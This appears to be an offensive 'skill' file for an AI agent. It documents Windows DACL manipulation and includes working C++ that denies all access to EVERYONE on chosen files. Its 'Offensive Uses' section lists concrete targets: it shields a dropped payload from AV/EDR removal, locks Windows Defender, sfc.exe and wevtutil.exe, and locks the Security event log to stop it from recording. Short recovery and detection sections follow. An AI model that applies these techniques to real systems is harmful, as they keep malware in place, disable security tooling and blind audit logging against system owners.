---
name: file-acl-bypass-path-parser
description: File ACL manipulation via DACL DENY_ACCESS for EVERYONE -- lock files from deletion/modification. SetSecurityInfo + DACL rewrite to protect or deny access to filesystem objects.
metadata:
  type: offensive
---

# File ACL Bypass / Path Parser (DACL Manipulation)

Manipulate Windows file DACLs (Discretionary Access Control Lists) to deny read/write/delete
access to specific files -- used offensively to protect malware from removal, or to lock
critical files as a denial-of-service.

## Core Concept

Every NTFS file has a security descriptor containing a DACL -- an ordered list of ACEs
(Access Control Entries). Each ACE grants or denies specific permissions to a SID (user/group).
`ACCESS_DENIED_ACE` entries are evaluated before `ACCESS_ALLOWED_ACE`, so a DENY for EVERYONE
overrides any ALLOW.

## Reference Implementation

```cpp
#include <windows.h>
#include <aclapi.h>
#include <sddl.h>

bool lock_file(const wchar_t* path) {
    // Build a DACL that denies all access to EVERYONE
    PSID everyone_sid = NULL;
    SID_IDENTIFIER_AUTHORITY world = SECURITY_WORLD_SID_AUTHORITY;
    if (!AllocateAndInitializeSid(&world, 1, SECURITY_WORLD_RID,
                                  0,0,0,0,0,0,0, &everyone_sid))
        return false;

    EXPLICIT_ACCESS_W ea = {};
    ea.grfAccessPermissions = GENERIC_ALL;
    ea.grfAccessMode        = DENY_ACCESS;
    ea.grfInheritance       = NO_INHERITANCE;
    ea.Trustee.TrusteeForm  = TRUSTEE_IS_SID;
    ea.Trustee.TrusteeType  = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea.Trustee.ptstrName    = (LPWSTR)everyone_sid;

    PACL new_dacl = NULL;
    if (SetEntriesInAclW(1, &ea, NULL, &new_dacl) != ERROR_SUCCESS) {
        FreeSid(everyone_sid);
        return false;
    }

    // Apply to the file
    DWORD r = SetNamedSecurityInfoW(
        (LPWSTR)path,
        SE_FILE_OBJECT,
        DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
        NULL, NULL, new_dacl, NULL
    );

    LocalFree(new_dacl);
    FreeSid(everyone_sid);
    return r == ERROR_SUCCESS;
}

bool unlock_file(const wchar_t* path) {
    // Take ownership first (requires SeTakeOwnershipPrivilege)
    // Then replace DACL with an empty (allow-all) DACL
    PSID admin_sid = NULL;
    SID_IDENTIFIER_AUTHORITY nt = SECURITY_NT_AUTHORITY;
    AllocateAndInitializeSid(&nt, 2, SECURITY_BUILTIN_DOMAIN_RID,
                             DOMAIN_ALIAS_RID_ADMINS, 0,0,0,0,0,0, &admin_sid);

    // Take ownership
    SetNamedSecurityInfoW((LPWSTR)path, SE_FILE_OBJECT,
                          OWNER_SECURITY_INFORMATION, admin_sid, NULL, NULL, NULL);

    // Set empty DACL (grants full access to everyone)
    ACL empty_acl;
    InitializeAcl(&empty_acl, sizeof(ACL), ACL_REVISION);
    DWORD r = SetNamedSecurityInfoW((LPWSTR)path, SE_FILE_OBJECT,
                                    DACL_SECURITY_INFORMATION,
                                    NULL, NULL, &empty_acl, NULL);
    FreeSid(admin_sid);
    return r == ERROR_SUCCESS;
}
```

## Offensive Uses

### Protect Malware From Deletion

```
1. Drop payload to C:\ProgramData\updater.exe
2. lock_file(L"C:\\ProgramData\\updater.exe")
3. Even Administrator cannot delete without taking ownership first
4. AV/EDR file quarantine fails with ACCESS_DENIED
```

### Deny Access to Security Tools

```
lock_file(L"C:\\Program Files\\Windows Defender\\MsMpEng.exe")
lock_file(L"C:\\Windows\\System32\\sfc.exe")
lock_file(L"C:\\Windows\\System32\\wevtutil.exe")
```

Prevents Defender from starting, blocks SFC, blocks event log export.

### Lock Event Logs

```
lock_file(L"C:\\Windows\\System32\\winevt\\Logs\\Security.evtx")
```

Prevents new events from being written (Event Log service can't open the file for writing).

## Key Flags

| Flag                                  | Purpose                                      |
|---------------------------------------|----------------------------------------------|
| `DACL_SECURITY_INFORMATION`           | Replace the DACL                             |
| `PROTECTED_DACL_SECURITY_INFORMATION` | Prevent parent folder inheritance from undoing the DENY |
| `OWNER_SECURITY_INFORMATION`          | Take ownership (needed to unlock)            |
| `DENY_ACCESS`                         | ACE mode that denies the specified rights     |
| `GENERIC_ALL`                         | All possible access rights                   |

## Recovery / Unlock

To undo a DENY EVERYONE DACL:

1. Enable `SeTakeOwnershipPrivilege` (requires admin)
2. `SetNamedSecurityInfo` with `OWNER_SECURITY_INFORMATION` to take ownership
3. Replace DACL with a permissive one

From an elevated command prompt:

```cmd
takeown /F "C:\path\to\file"
icacls "C:\path\to\file" /reset
icacls "C:\path\to\file" /grant Administrators:F
```

## Detection

- Sysmon Event ID 1 with `SetSecurityInfo` or `icacls` in command line
- File access auditing (SACL): enable `Audit object access` in Group Policy
- EDR monitoring `SetNamedSecurityInfo` API calls for DENY_ACCESS patterns
- Unexpected `ACCESS_DENIED` on security tool executables = strong signal

## Related Skills

- `lolbas-living-off-land` -- icacls is itself a LOLBIN when used offensively
- `evtx-tamper-detection` -- detecting the effects of log file locking
